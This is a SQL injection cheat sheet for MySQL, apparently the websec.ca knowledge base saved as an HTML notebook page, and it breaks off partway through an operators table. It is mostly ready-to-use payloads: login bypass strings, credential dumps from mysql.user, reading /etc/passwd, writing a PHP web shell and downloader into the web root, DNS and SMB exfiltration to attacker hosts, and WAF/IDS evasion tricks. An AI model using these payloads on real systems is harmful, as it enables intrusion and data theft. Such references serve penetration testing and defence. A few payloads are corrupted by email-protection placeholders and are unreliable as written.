<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>websec.ca</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">websec.ca</h1><br/><a href="https://websec.ca/kb/sql_injection">https://websec.ca/kb/sql_injection</a><br /><br />    <br /><h1>MySQL</h1><br />    <br /><h2>Default Databases</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>mysql</td><td>Requires root privileges</td></tr><tr><td>information_schema</td><td>Availalble from version 5 and higher</td></tr></table><br />    <br /><h2>Testing Injection</h2><br />          False means the query is invalid (MySQL errors/missing content on website)      <br />          True means the query is valid (content is displayed as usual)     <br />               •        <a href="https://websec.ca/kb/sql_injection#MySQL_Strings">Strings</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Numeric">Numeric</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_In_a_login">In a login</a>      <br />                        Given the query        <code>         SELECT * FROM Table WHERE id = '1';        </code>       <br />      <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>'</td><td>False</td></tr><tr><td>''</td><td>True</td></tr><tr><td>"</td><td>False</td></tr><tr><td>""</td><td>True </td></tr><tr><td>\</td><td>False</td></tr><tr><td>\\</td><td>True </td></tr></table><br />      <br />      <em>Examples:</em>             •         SELECT * FROM Articles WHERE id = '1<strong>''</strong>';       <br />       •         SELECT 1 FROM dual WHERE 1 = '1<strong>'''''''''''''UNION SELECT '2</strong>';       <br />                    <em> Notes:        </em><br /><em>         •           You can use as many apostrophes and quotations as you want as long as they pair up.         <br />         •           </em><em><code>          </code></em><em>         <br />         •           It is also possible to continue the statement after the chain of quotes.         <br />         •           Quotes escape quotes.         <br />        </em>      <br />                        Given the query        <code>         SELECT * FROM Table WHERE id = 1;        </code>       <br />      <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>AND 1</td><td>True</td></tr><tr><td>AND 0</td><td>False</td></tr><tr><td>AND true</td><td>True</td></tr><tr><td>AND false</td><td>False</td></tr><tr><td>1-false</td><td>Returns 1 if vulnerable</td></tr><tr><td>1-true</td><td>Returns 0 if vulnerable</td></tr><tr><td>1*56</td><td>Returns 56 if vulnerable</td></tr><tr><td>1*56</td><td>Returns 1 if not vulnerable</td></tr></table><br />      <br />      <em>Example:</em>             •         SELECT * FROM Users WHERE id = 3<strong>-2</strong>;       <br />                    <em> Notes:        </em><br /><em>         •           </em><em><code>           true          </code></em><em>          is equal to 1.         <br />         •           </em><em><code>           false          </code></em><em>          is equal to 0.         <br />        </em>      <br />                        Given the query        <code>         SELECT * FROM Table WHERE username = '';        </code>       <br />      <table class="table"><col/><tr><th>click me</th></tr><tr><td>' OR '1</td></tr><tr><td>' OR 1 -- -</td></tr><tr><td>" OR "" = "</td></tr><tr><td>" OR 1 = 1 -- -</td></tr><tr><td>'='</td></tr><tr><td>'LIKE'</td></tr><tr><td>'=0--+</td></tr></table><br />      <br />      <em>Example:</em>             •         SELECT * FROM Users WHERE username = 'Mike' AND password = '<strong>' OR '' = '</strong>';       <br />                   <br /><h2>Comment Out Query</h2><br />          The following can be used to comment out the rest of the query after your injection:     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>#</td><td>Hash comment</td></tr><tr><td>/*</td><td>C-style comment</td></tr><tr><td>-- -</td><td>SQL comment</td></tr><tr><td>;%00</td><td>Nullbyte</td></tr><tr><td>`</td><td>Backtick</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT * FROM Users WHERE username = '' OR 1=1 <strong>-- -</strong>' AND password = '';     <br />     •       SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3<strong>`</strong>';     <br />              <em> Note:      </em><br /><em>       •         The backtick can only be used to end a query when used as an alias.       <br />      </em>    <br />    <br /><h2>Testing Version</h2><br />               •        <a href="https://websec.ca/kb/sql_injection#MySQL_Testing_Version_Variables">Variables</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Testing_Version_Specific_Code">Specific Code</a>      <br />                       •         <code>         VERSION()        </code>       <br />       •         <code>         @@VERSION        </code>       <br />       •         <code>         @@GLOBAL.VERSION        </code>       <br />            <br />      <em>Example:</em>             •         SELECT * FROM Users WHERE id = '1' AND MID(<strong>VERSION()</strong>,1,1) = '5';       <br />                    <em> Note:        </em><br /><em>         •           Output will contain          </em><em><code>           -nt-log          </code></em><em>          in case the DBMS runs on a Windows based machine.         <br />         </em>      <br />                       <code>        /*!VERSION Specific Code*/       </code>            <br />      <em>Example:</em>                      Given the query         <code>          SELECT * FROM Users limit 1,{INJECTION POINT};         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1 /*!50094eaea*/;</td><td>False - version is equal or greater than 5.00.94</td></tr><tr><td>1 /*!50096eaea*/;</td><td>True - version is lesser than 5.00.96</td></tr><tr><td>1 /*!50095eaea*/;</td><td>False - version is equal to 5.00.95</td></tr></table><br />                    <em> Note:        </em><br /><em>         •           It can be useful for determining the version in situations  where you can't add anymore SQL to the query due to the position of the  injection.         <br />         •           For more information about MySQL-specific code please refer to </em><a href="https://websec.ca/kb/sql_injection#MySQL_Specific_Code">MySQL-specific code</a><em>.         <br />        </em>      <br />             <br /><h2>Database Credentials</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>Table</td><td>mysql.user</td></tr><tr><td>Columns</td><td>user, password</td></tr><tr><td>Current User</td><td>user(), current_user(), current_user, system_user(), session_user()</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT <strong>current_user</strong>;     <br />     •       SELECT CONCAT_WS(0x3A, <strong>user</strong>, <strong>password</strong>) FROM <strong>mysql.user</strong> WHERE user = 'root'-- (Privileged)     <br />        <br /><h2>Database Names</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>Tables</td><td>information_schema.schemata, mysql.db</td></tr><tr><td>Columns</td><td>schema_name, db</td></tr><tr><td>Current DB</td><td>database(), schema()</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT <strong>database()</strong>;     <br />     •       SELECT <strong>schema_name</strong> FROM <strong>information_schema.schemata</strong>;     <br />     •       SELECT DISTINCT(<strong>db</strong>) FROM <strong>mysql.db</strong>;-- (Privileged)     <br />        <br /><h2>Server Hostname</h2><br />         •       @@HOSTNAME     <br />        <br />    <em>Example:</em>         •       SELECT <strong>@@hostname</strong>;     <br />        <br /><h2>Server MAC Address</h2><br />          The Universally Unique Identifier is a 128-bit number where the last 12 digits are formed from the interfaces MAC address.     <br />         •       UUID()     <br />        <br />    <em>Output:</em>         •       aaaaaaaa-bbbb-cccc-dddd-<strong>eeeeeeeeeeee</strong>;     <br />              <em> Note:      </em><br /><em>       •         May return a 48-bit random string instead of the MAC address on some Operating Systems.       <br />      </em>    <br />    <br /><h2>Tables and Columns</h2><br />    <br /><h3>Determining number of columns</h3><br />               •        <a href="https://websec.ca/kb/sql_injection#MySQL_Number_Of_Columns_GroupOrder_By">Order/Group By</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Number_Of_Columns_Error_Based">Error Based</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Number_Of_Columns_Error_Based2">Error Based 2</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Number_Of_Columns_Error_Based3">Error Based 3</a>      <br />                       <code>        GROUP/ORDER BY n+1;       </code>                    <em> Notes:        </em><br /><em>         •           Keep incrementing the number until you get a False response.         <br />         •           Even though GROUP BY and ORDER BY have different funcionality  in SQL, they both can be used in the exact same fashion to determine the  number of columns in the query.         <br />        </em>      <br />      <br />      <em>Example:</em>                      Given the query         <code>          SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1' ORDER BY 1--+</td><td>True</td></tr><tr><td>1' ORDER BY 2--+</td><td>True</td></tr><tr><td>1' ORDER BY 3--+</td><td>True </td></tr><tr><td>1' ORDER BY 4--+</td><td>False - Query is only using 3 columns</td></tr><tr><td>-1' UNION SELECT 1,2,3--+</td><td>True</td></tr></table><br />                             <code>        GROUP/ORDER BY 1,2,3,4,5...       </code>                    <em> Note:        </em><br /><em>         •           Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.         <br />        </em>      <br />      <br />      <em>Examples:</em>                      Given the query         <code>          SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1' GROUP BY 1,2,3,4,5--+</td><td>Unknown column '4' in 'group statement' </td></tr><tr><td>1' ORDER BY 1,2,3,4,5--+</td><td>Unknown column '4' in 'order clause' </td></tr></table><br />                             <code>        SELECT ... INTO var_list, var_list1, var_list2...       </code>                    <em> Notes:        </em><br /><em>         •           This method works if error showing is enabled.         <br />         •           It is useful for finding the number of columns when the injection point is after a LIMIT clause.         <br />        </em>      <br />      <br />      <em>Example:</em>                      Given the query         <code>          SELECT permission FROM Users WHERE id = {INJECTION POINT};         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>-1 UNION SELECT 1 INTO @,@,@</td><td>The used SELECT statements have a different number of columns</td></tr><tr><td>-1 UNION SELECT 1 INTO @,@</td><td>The used SELECT statements have a different number of columns</td></tr><tr><td>-1 UNION SELECT 1 INTO @</td><td>No error means query uses 1 column</td></tr></table><br />            <em>Example 2:</em>                      Given the query         <code>          SELECT username, permission FROM Users limit 1,{INJECTION POINT};         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1 INTO @,@,@</td><td>The used SELECT statements have a different number of columns</td></tr><tr><td>1 INTO @,@</td><td>No error means query uses 2 columns</td></tr></table><br />                             <code>        AND (SELECT * FROM SOME_EXISTING_TABLE) = 1       </code>                    <em> Notes:        </em><br /><em>         •           This works if you know the table name you're after and error showing is enabled.         <br />         •           It will return the amount of columns in the table, not the query.         <br />        </em>      <br />      <br />      <em>Example:</em>                      Given the query         <code>          SELECT permission FROM Users WHERE id = {INJECTION POINT};         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1 AND (SELECT * FROM Users) = 1</td><td>Operand should contain 3 column(s)</td></tr></table><br />                   <br /><h3>Retrieving Tables</h3><br />               •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Tables_Union">Union</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Tables_Blind">Blind</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Tables_Error">Error</a>      <br />                <div class="codebox"><div class="codebox">UNION&nbsp;SELECT&nbsp;GROUP_CONCAT(table_name)&nbsp;FROM&nbsp;information_schema.tables&nbsp;WHERE&nbsp;version=10;</div></div><br />                <div class="codebox"><div class="codebox">AND&nbsp;SELECT&nbsp;SUBSTR(table_name,1,1)&nbsp;FROM&nbsp;information_schema.tables&nbsp;&gt;&nbsp;'A'</div></div><br />                <table class="table"><col/><tr><th>click me</th></tr><tr><td>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))</td></tr><tr><td>(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),[email protected]) HAVING @||MIN(@:=0);</td></tr><tr><td>AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name  FROM  information_schema.tables LIMIT 1)));-- Available in 5.1.5</td></tr></table><br />                   <em> Note:      </em><br /><em>       •         version=10 for MySQL 5       <br />      </em>    <br />    <br /><h3>Retrieving Columns</h3><br />               •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Columns_Union">Union</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Columns_Blind">Blind</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Columns_Error">Error</a>      <br />      •        <a href="https://websec.ca/kb/sql_injection#MySQL_Retrieving_Columns_PROCEDURE_ANALYSE">PROCEDURE ANALYSE()</a>      <br />                <div class="codebox"><div class="codebox">UNION&nbsp;SELECT&nbsp;GROUP_CONCAT(column_name)&nbsp;FROM&nbsp;information_schema.columns&nbsp;WHERE&nbsp;table_name&nbsp;=&nbsp;'tablename'</div></div><br />                <div class="codebox"><div class="codebox">AND&nbsp;SELECT&nbsp;SUBSTR(column_name,1,1)&nbsp;FROM&nbsp;information_schema.columns&nbsp;&nbsp;&gt;&nbsp;'A'</div></div><br />                <table class="table"><col/><tr><th>click me</th></tr><tr><td>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))</td></tr><tr><td>(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),[email protected]) HAVING @||MIN(@:=0);</td></tr><tr><td>AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name  FROM  information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5</td></tr><tr><td>AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1</td></tr><tr><td>AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)</td></tr><tr><td>AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)</td></tr></table><br />                       <code>        PROCEDURE ANALYSE()       </code>                    <em> Note:        </em><br /><em>         •           It is necessary for the web app to display the one of the selected columns in the SQL query you are injecting to.         <br />        </em>      <br />      <br />      <em>Example:</em>                      Given the query         <code>          SELECT username, permission FROM Users WHERE id = 1;         </code>        <br />       <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>1 PROCEDURE ANALYSE()</td><td>Get the first column's name</td></tr><tr><td>1 LIMIT 1,1 PROCEDURE ANALYSE()</td><td>Get the second column's name</td></tr><tr><td>1 LIMIT 2,1 PROCEDURE ANALYSE()</td><td>Get the third column's name</td></tr></table><br />                   <br /><h3>Retrieving Multiple Tables/Columns at once</h3><br />         •       SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;<a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x     <br />        <br />    <em>Example:</em>         •       SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, <strong>(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;</strong><a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a><strong>) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x)</strong>, 4--+';     <br />        <br />    <em>Output:</em>         [ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME<br />[ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME<br />[ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION<br />[ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN<br />[ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME<br />[ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME<br />[ information_schema ] &gt;COLLATIONS &gt; ID<br />[ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT<br />[ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED<br />						        <br />         •       SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns      <br />        <br />    <em>Example:</em>         •       SELECT username FROM Users WHERE id = '-1' UNION SELECT <strong>MID(GROUP_CONCAT(0x3c62723e,  0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20,  column_name ORDER BY (SELECT version FROM information_schema.tables)  SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns</strong>--+';     <br />        <br />    <em>Output:</em>         Table: talk_revisions<br />Column: revid<br /><br />Table: talk_revisions<br />Column: userid<br /><br />Table: talk_revisions<br />Column: user<br /><br />Table: talk_projects<br />Column: priority<br />					        <br /><h3>Find Tables from Column Name</h3><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT table_name FROM information_schema.columns WHERE column_name = 'username';</td><td>Finds the table names for any columns named username.</td></tr><tr><td>SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</td><td>Finds the table names for any columns that contain the word user.</td></tr></table><br />    <br /><h3>Find Columns from Table Name</h3><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';</td><td>Finds the columns for the Users table.</td></tr><tr><td>SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';</td><td>Finds the column names for any tables that contain the word user.</td></tr></table><br />    <br /><h3>Find out current query</h3><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT info FROM information_schema.processlist</td><td>Available starting from MySQL 5.1.7.</td></tr></table><br />    <br /><h2>Avoiding the use of quotations</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SELECT * FROM Users WHERE username = 0x61646D696E</td><td>Hex encoding.</td></tr><tr><td>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td><td>CHAR() Function.</td></tr></table><br />    <br /><h2>String Concatenation</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>SELECT 'a' 'd' 'mi' 'n';</td></tr><tr><td>SELECT CONCAT('a', 'd', 'm', 'i', 'n');</td></tr><tr><td>SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');</td></tr><tr><td>SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');</td></tr></table><br />          <em> Notes:      </em><br /><em>       •         </em><em><code>CONCAT()</code></em><em> will return NULL if any of its arguements is NULL. Instead use </em><em><code>CONCAT_WS()</code></em><em>.       <br />       •         The first argument of </em><em><code>CONCAT_WS()</code></em><em> defines the separator for the rest of its arguments.       <br />      </em>    <br />    <br /><h2>Conditional Statements</h2><br />    <table class="table"><col/><tr><th>click me</th></tr><tr><td>CASE</td></tr><tr><td>IF()</td></tr><tr><td>IFNULL()</td></tr><tr><td>NULLIF()</td></tr></table><br />    <br />    <em>Examples:</em>         •       SELECT <strong>IF(</strong>1=1, true, false<strong>)</strong>;     <br />     •       SELECT <strong>CASE WHEN</strong> 1=1 <strong>THEN</strong> true <strong>ELSE</strong> false <strong>END</strong>;     <br />        <br /><h2>Timing</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>SLEEP()</td><td>MySQL 5</td></tr><tr><td>BENCHMARK()</td><td>MySQL 4/5</td></tr></table><br />    <br />    <em>Example:</em>         •       ' - (IF(MID(version(),1,1) LIKE 5, <strong>BENCHMARK(100000,SHA1('true'))</strong>, false)) - '     <br />        <br /><h2>Privileges</h2><br />    <br /><h3>File Privileges</h3><br />          The following queries can help determine the FILE privileges for a given user.     <br />    <table class="table"><col/><col/><col/><tr><th>click me</th><th>click me</th><th>click me</th></tr><tr><td>SELECT file_priv FROM mysql.user WHERE user = 'username';</td><td>Root privileges required</td><td>MySQL 4/5</td></tr><tr><td>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</td><td>No privileges required</td><td>MySQL 5</td></tr></table><br />    <br /><h2>Reading Files</h2><br />          Files can be read if the user has FILE privileges.     <br />         •       LOAD_FILE()     <br />        <br />    <em>Examples:</em>         •       SELECT <strong>LOAD_FILE(</strong>'/etc/passwd'<strong>)</strong>;     <br />     •       SELECT <strong>LOAD_FILE(</strong>0x2F6574632F706173737764<strong>)</strong>;     <br />              <em> Notes:      </em><br /><em>       •         File must be located on the server host.       <br />       •         The basedirectory for LOAD_FILE() is        </em><em><code>         @@datadir        </code></em><em>        .       <br />       •         The file must be readable by the MySQL user.       <br />       •         The file size must be less than max_allowed_packet.       <br />       •         The default size for        </em><em><code>         @@max_allowed_packet        </code></em><em>        is 1047552 bytes.       <br />      </em>    <br />    <br /><h2>Writing Files</h2><br />          Files can be created if the user has FILE privileges.     <br />         •       INTO OUTFILE/DUMPFILE     <br />        <br />    <em>Examples:</em>         •       To write a PHP shell:     <br />     •       SELECT '&lt;? system($_GET[\'c\']); ?&gt;' <strong>INTO OUTFILE</strong> '/var/www/shell.php';     <br />     <br />     •       and then access it at:     <br />     •       http://localhost/shell.php?c=cat%20/etc/passwd     <br />             •       To write a downloader:     <br />•       SELECT '&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;' <strong>INTO OUTFILE</strong> '/var/www/get.php'     <br />     <br />     •       and then access it at:     <br />     •       http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt     <br />              <em> Notes:      </em><br /><em>       •         Files cannot be overwritten with        </em><em><code>         INTO OUTFILE        </code></em><em>        .       <br />       •         </em><em><code>         INTO OUTFILE        </code></em><em>        must be the last statement in the query.       <br />       •         There is no way to encode the pathname, so quotes are required.       <br />      </em>    <br />    <br /><h2>Out Of Band Channeling</h2><br />    <br /><h3>DNS Requests</h3><br />    <div class="codebox"><div class="codebox">SELECT&nbsp;LOAD_FILE(CONCAT('\\\\foo.',(select&nbsp;MID(version(),1,1)),'.attacker.com\\'));</div></div><br />    <br /><h3>SMB Requests</h3><br />    <div class="codebox"><div class="codebox">'&nbsp;OR&nbsp;1=1&nbsp;INTO&nbsp;OUTFILE&nbsp;'\\\\attacker\\SMBshare\\output.txt</div></div><br />    <br /><h2>Stacked Queries</h2><br />          Stacked queries are possible with MySQL depending on which driver  is being used by the PHP application to communicate with the database.     <br />          The <code>       PDO_MYSQL</code>      driver supports stacked queries. The <code>       MySQLi</code>      (Improved Extension) driver also supports stacked queries through the <code>       multi_query()</code>      function.     <br />    <br />    <em>Examples:</em>         •       SELECT * FROM Users WHERE ID=1 AND 1=0<strong>;</strong> INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');     <br />     •       SELECT * FROM Users WHERE ID=1 AND 1=0<strong>;</strong> SHOW COLUMNS FROM Users;     <br />        <br /><h2>MySQL-specific code</h2><br />          MySQL allows you to specify the version number after the  exclamation mark. The syntax within the comment is only executed if the  version is greater or equal to the specified version number.     <br />    <br />    <em>Examples:</em>         •       UNION SELECT <strong>/*!50000</strong> 5,null;%00<strong>*//*!40000</strong> 4,null-- ,<strong>*//*!30000</strong> 3,null-- x<strong>*/</strong>0,null--+     <br />     •       SELECT 1<strong>/*!41320</strong>UNION<strong>/*!/*!/*!00000</strong>SELECT<strong>/*!/*!</strong>USER<strong>/*!</strong>(<strong>/*!/*!/*!*/</strong>);     <br />              <em> Notes:      </em><br /><em>       •         The first example returns the version; it uses a UNION with 2 columns.       <br />       •         The second example demonstrates how this can be useful for bypassing a WAF/IDS.       <br />      </em>    <br />    <br /><h2>Fuzzing and Obfuscation</h2><br />    <br /><h3>Allowed Intermediary Characters</h3><br />          The following characters can be used as whitespaces.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>09</td><td>Horizontal Tab</td></tr><tr><td>0A</td><td>New Line</td></tr><tr><td>0B</td><td>Vertical Tab</td></tr><tr><td>0C</td><td>New Page</td></tr><tr><td>0D</td><td>Carriage Return</td></tr><tr><td>A0</td><td>Non-breaking Space</td></tr><tr><td>20</td><td>Space</td></tr></table><br />    <br />    <em>Example:</em>         •       '<strong>%0A%09</strong>UNION<strong>%0C</strong>SELECT<strong>%A0</strong>NULL<strong>%20</strong>%23     <br />        <br />          Parentheses can also be used to avoid the use of spaces.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>28</td><td>(</td></tr><tr><td>29</td><td>)</td></tr></table><br />    <br />    <em>Example:</em>         •       UNION<strong>(</strong>SELECT<strong>(</strong>column<strong>)</strong>FROM<strong>(</strong>table<strong>))</strong>     <br />        <br /><h3>Allowed Intermediary Characters after AND/OR</h3><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>20</td><td>Space</td></tr><tr><td>2B</td><td>+</td></tr><tr><td>2D</td><td>-</td></tr><tr><td>7E</td><td>~</td></tr><tr><td>21</td><td>!</td></tr><tr><td>40</td><td>@</td></tr></table><br />    <br />    <em>Example:</em>         •       SELECT 1 FROM dual WHERE 1=1 AND<strong>-+-+-+-+~~</strong>((1))     <br />              <em> Note:      </em><br /><em>       •         </em><em><code>         dual        </code></em><em>        is a dummy table which can be used for testing.       <br />      </em>    <br />    <br /><h3>Obfuscating with Comments</h3><br />          Comments can be used to break up the query to trick the WAF/IDS and  avoid detection. By using # or -- followed by a newline, we can split  the query into separate lines.     <br />    <em>Example:</em>         •       1'<strong>#</strong>      <br />      AND 0<strong>--</strong>      <br />      UNION<strong># I am a comment!</strong>      <br />      <a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>:=table_name x FROM<strong>--</strong>      <br />      `information_schema`.tables LIMIT 1<strong>#</strong>      <br />     <br />              URL Encoded the injection would look like:     <br />         •       1'<strong>%23%0A</strong>AND 0<strong>--%0A</strong>UNION<strong>%23 I am a comment!%0A</strong><a href="https://websec.ca/cdn-cgi/l/email-protection">[email protected]</a>:=table_name x FROM<strong>--%0A</strong>`information_schema`.tables LIMIT 1<strong>%23</strong>     <br />              Certain functions can also be obfuscated with comments and whitespaces.     <br />         •       VERSION<strong>/**/%A0</strong> (<strong>/*comment*/</strong>)     <br />        <br /><h3>Encodings</h3><br />          Encoding your injection can sometimes be useful for WAF/IDS evasion.     <br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>URL Encoding</td><td>SELECT %74able_%6eame FROM information_schema.tables;</td></tr><tr><td>Double URL Encoding</td><td>SELECT %2574able_%256eame FROM information_schema.tables;</td></tr><tr><td>Unicode Encoding</td><td>SELECT %u0074able_%u6eame FROM information_schema.tables;</td></tr><tr><td>Invalid Hex Encoding (ASP)</td><td>SELECT %tab%le_%na%me FROM information_schema.tables;</td></tr></table><br />    <br /><h3>Avoiding Keywords</h3><br />          If an IDS/WAF has blocked certain keywords, there are other ways of getting around it without using encodings.     <br />         •       information_schema.tables     <br />        <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>Spaces</td><td>information_schema .   tables</td></tr><tr><td>Backticks</td><td>`information_schema`.`tables`</td></tr><tr><td>Specific Code</td><td>/*!information_schema.tables*/</td></tr><tr><td>Alternative Names</td><td>information_schema.partitions
information_schema.statistics
information_schema.key_column_usage
information_schema.table_constraints</td></tr></table><br />          <em> Note:      </em><br /><em>       •         The alternate names may depend on a PRIMARY Key being present in the table.       <br />      </em>    <br />    <br /><h2>Operators</h2><br />    <table class="table"><col/><col/><tr><th>click me</th><th>click me</th></tr><tr><td>AND,&amp;&amp;</td><td>Logical AND</td></tr><tr><td>=</td><td>Assign a value (as part of a SET statement, or as part of theSET clause in an UPDATE statement) </td></tr><tr><td>:=</td><td>Assign a value</td></tr><tr><td>BETWEEN ... AND ...</td><td>Check whether a value is within a range of values</td></tr><tr><td>BINARY</td><td>Cast a string to a binary string</td></tr><tr><td>&amp;</td><td>Bitwise AND</td></tr><tr><td>~</td><td>Invert bits</td></tr><tr><td>|</td><td>Bitwise OR</td></tr><tr><td>^</td><td>Bitwise XOR</td></tr><tr><td>CASE</td><td>Case operator</td></tr><tr><td>DIV</td><td>Integer division</td></tr><tr><td>/</td><td>Division operator</td></tr><tr><td>&lt;=&gt;</td><td>NULL-safe equal to operator</td></tr><tr><td>=</td><td>Equal operator</td></tr><tr><td>&gt;=</td><td>Greater than or equal operator</td></tr><tr><td>&gt;</td><td>Greater than operator</td></tr><tr><td>IS NOT NULL</td><td>NOT NULL value test</td></tr><tr><td>IS NOT</td><td>Test a value against a boolean</td></tr><tr><td>IS NULL</td><td>NULL value test</td></tr><tr><td>IS</td><td>Test a value against a boolean</td></tr><tr><td>&lt;&lt;</td><td>Left shift</td></tr><tr><td>&lt;=</td><td>Less than or equal operator</td></tr><tr><td>&lt;</td><td>Less than operator</td></tr><tr><td>LIKE</td><td>Simple pattern matching</td></tr><tr><td>-</td><td>Minus operator</td></tr><tr><td>% or MOD</td><td>Modulo operator</td></tr><tr><td>NOT BETWEEN ... AND ...</td><td>Check whether a value is not within a range of values</td></tr><tr><td>!=,&lt;&gt;</td><td>Not equal operator</td></tr><tr><td>NOT LIKE</td><td>Negation of simple pattern matching</td></tr><tr><td>NOT REGEXP</td><td>Negation of REGEXP</td></tr><tr><td>NOT,!</td><td>Negates value</td></tr><tr><td>||,OR</td><td>Logical OR</td></tr><tr><td>+</td><td>Addition operator</td></tr><tr><td>REGEXP</td><td>Pattern matching using regular 